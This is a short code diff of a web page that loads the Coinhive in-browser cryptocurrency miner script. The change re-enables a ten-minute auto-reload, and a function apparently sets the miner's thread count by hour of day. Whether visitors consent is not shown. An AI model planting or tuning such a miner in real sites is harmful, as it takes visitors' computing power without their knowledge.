@@ -6,12 +6,14 @@
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <body>
     <script>
-        //function AutoRefresh(timeout) {
-            //setTimeout("location.reload(true);",timeout);
-        //}
-        //window.onload = AutoRefresh(10*60*1000); // min * s * ms
+        function AutoRefresh(timeout) {
+            setTimeout("location.reload(true);",timeout);
+        }
+        window.onload = AutoRefresh(10*60*1000); // min * s * ms
 
         function getN() {
+            // var m = new Date().getMinutes();
+            // return m % 10;
             var h = new Date().getHours();
             if(h>7 && h<23)
                 return 3;
